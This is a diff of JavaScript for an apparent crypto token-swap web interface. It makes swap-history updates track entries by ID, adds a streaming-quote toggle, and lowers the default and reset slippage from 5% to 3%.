@@ -1281,17 +1416,21 @@ function stopTracking(){
     }
 }
 
-function updateHistoryStatus(s){
-    if(state.history.length>0){
-        state.history[0].status=s;
-        localStorage.setItem('tc-swap-history',JSON.stringify(state.history));
-        var d=$('#historyDot');
-        if(d)d.style.display='';
+function updateHistoryStatus(s,swapId){
+    for(var i=0;i<state.history.length;i++){
+        if(state.history[i].swapId===swapId){
+            state.history[i].status=s;
+            break;
+        }
     }
+    localStorage.setItem('tc-swap-history',JSON.stringify(state.history));
+    var d=$('#historyDot');
+    if(d)d.style.display='';
 }
 
-function saveToHistory(sa,ss,si,su,ba,bs,bi,bu,st){
+function saveToHistory(sa,ss,si,su,ba,bs,bi,bu,st,swapId){
     state.history.unshift({
+        swapId:swapId||generateSwapId(),
         sellAmount:sa,
         sellSymbol:ss,
         sellIcon:si,
@@ -1427,13 +1566,12 @@ function initSettings(){
     
     so.onclick=function(e){if(e.target===so)so.classList.remove('open')};
     
-    // Slider - FIXED: Default to 5%
+    // Slider - Default to 3%
     var slider=$('#slippageSlider');
     var display=$('#slipValueDisplay');
     if(slider){
-        slider.value=state.slippage; // Will be 5 now
+        slider.value=state.slippage;
         if(display)display.textContent=state.slippage+'%';
-        // Set initial gradient
         var initPct=((state.slippage-parseFloat(slider.min))/(parseFloat(slider.max)-parseFloat(slider.min)))*100;
         slider.style.background='linear-gradient(to right,var(--brand-first) 0%,var(--brand-first) '+initPct+'%,var(--blade) '+initPct+'%,var(--blade) 100%)';
         
@@ -1445,6 +1583,16 @@ function initSettings(){
         });
     }
     
+    // Streaming toggle
+    var streamToggle=$('#streamingToggle');
+    if(streamToggle){
+        streamToggle.checked=state.streamingEnabled;
+        streamToggle.addEventListener('change',function(){
+            state.streamingEnabled=this.checked;
+            debouncedFetchQuote();
+        });
+    }
+    
     // TWAP buttons
     $$('.tc-twap-btn').forEach(function(btn){
         btn.addEventListener('click',function(){
@@ -1453,18 +1601,23 @@ function initSettings(){
         });
     });
     
-    // Reset - FIXED: Reset to 5%
+    // Reset - Reset to 3%
     var rst=$('#settingsReset');
     if(rst){
         rst.onclick=function(){
-            state.slippage=5;
+            state.slippage=3;
+            state.streamingEnabled=false;
             if(slider){
-                slider.value=5;
+                slider.value=3;
                 slider.dispatchEvent(new Event('input'));
+            }
+            if(streamToggle){
+                streamToggle.checked=false;
             }
             $$('.tc-twap-btn').forEach(function(b){b.classList.remove('active')});
             var bp=$('.tc-twap-btn[data-twap="best-price"]');
             if(bp)bp.classList.add('active');
+            debouncedFetchQuote();
         };
     }
     
